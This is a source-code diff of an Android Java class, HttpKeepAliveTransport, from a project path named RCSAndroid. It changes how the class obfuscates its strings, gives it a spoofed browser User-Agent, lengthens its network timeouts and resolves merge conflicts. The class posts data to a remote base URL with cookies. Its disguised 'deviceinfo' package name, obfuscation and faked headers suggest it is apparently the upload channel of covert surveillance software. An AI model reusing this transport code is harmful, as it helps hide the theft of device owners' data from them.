@@ -16,23 +16,20 @@ import org.apache.http.HttpResponse;
 import org.apache.http.HttpStatus;
 import org.apache.http.HttpVersion;
 import org.apache.http.client.methods.HttpPost;
-import org.apache.http.conn.ConnectionKeepAliveStrategy;
-import org.apache.http.conn.params.ConnManagerParams;
 import org.apache.http.conn.scheme.PlainSocketFactory;
 import org.apache.http.conn.scheme.Scheme;
 import org.apache.http.conn.scheme.SchemeRegistry;
 import org.apache.http.cookie.Cookie;
 import org.apache.http.entity.ByteArrayEntity;
 import org.apache.http.impl.client.DefaultHttpClient;
-import org.apache.http.impl.conn.tsccm.ThreadSafeClientConnManager;
 import org.apache.http.params.BasicHttpParams;
 import org.apache.http.params.HttpConnectionParams;
 import org.apache.http.params.HttpProtocolParams;
 
-import com.android.deviceinfo.Messages;
 import com.android.deviceinfo.auto.Cfg;
 import com.android.deviceinfo.util.Check;
 import com.android.deviceinfo.util.Utils;
+import com.android.m.M;
 
 public abstract class HttpKeepAliveTransport extends HttpTransport {
 	private static final String TAG = "HttpKeepAliveTransport"; //$NON-NLS-1$
@@ -69,9 +66,9 @@ public abstract class HttpKeepAliveTransport extends HttpTransport {
 
 		final HttpPost httppost = new HttpPost(baseurl);
 
-		httppost.setHeader(Messages.getString("3_0"), //$NON-NLS-1$
-				Messages.getString("3_1")); //$NON-NLS-1$
-		httppost.setHeader(Messages.getString("3_2"), Messages.getString("3_3")); //$NON-NLS-1$ //$NON-NLS-2$
+		httppost.setHeader(M.e("User-Agent"), //$NON-NLS-1$
+		M.e("Mozilla/5.0 (Linux; U; Android 0.5; en-us) AppleWebKit/522+ (KHTML, like Gecko) Safari/419.3")); //$NON-NLS-1$
+		httppost.setHeader(M.e("Content-Type"), M.e("application/octet-stream")); //$NON-NLS-1$ //$NON-NLS-2$
 
 		if (cookies != null) {
 			for (final Cookie cookie : cookies) {
@@ -82,6 +79,7 @@ public abstract class HttpKeepAliveTransport extends HttpTransport {
 
 		DataInputStream in = null;
 		Statistics stat = null;
+		
 		try {
 
 			if (Cfg.PROTOCOL_RANDBLOCK) {
@@ -94,7 +92,9 @@ public abstract class HttpKeepAliveTransport extends HttpTransport {
 			if (Cfg.STATISTICS) {
 				stat = new Statistics("httpclient", data.length);
 			}
+			
 			final HttpResponse response = httpclient.execute(httppost);
+			
 			if (Cfg.STATISTICS) {
 				stat.stop();
 			}
@@ -176,15 +176,12 @@ public abstract class HttpKeepAliveTransport extends HttpTransport {
 		
 		// final HttpParams httpParameters = new BasicHttpParams();
 		// Set the timeout in milliseconds until a connection is established.
-		final int timeoutConnection = 90000;
+		final int timeoutConnection = 120000;
 		HttpConnectionParams.setConnectionTimeout(httpParameters, timeoutConnection);
+		
 		// Set the default socket timeout (SO_TIMEOUT)
 		// in milliseconds which is the timeout for waiting for data.
-<<<<<<< HEAD:RCSAndroid/src/com/android/service/action/sync/HttpKeepAliveTransport.java
-		final int timeoutSocket = 60000;
-=======
-		final int timeoutSocket = 30000;
->>>>>>> 8.2:RCSAndroid/src/com/android/networking/action/sync/HttpKeepAliveTransport.java
+		final int timeoutSocket = 120000;
 		HttpConnectionParams.setSoTimeout(httpParameters, timeoutSocket);
 
 		httpclient = new DefaultHttpClient(httpParameters);
@@ -194,14 +191,6 @@ public abstract class HttpKeepAliveTransport extends HttpTransport {
 			statistics.start(false);
 		}
 
-<<<<<<< HEAD:RCSAndroid/src/com/android/service/action/sync/HttpKeepAliveTransport.java
-		httpclient.setKeepAliveStrategy(new ConnectionKeepAliveStrategy() {
-			public long getKeepAliveDuration(HttpResponse response, org.apache.http.protocol.HttpContext context) {
-				return 60000;
-			}
-		});
-=======
->>>>>>> 8.2:RCSAndroid/src/com/android/networking/action/sync/HttpKeepAliveTransport.java
 	}
 
 	@Override
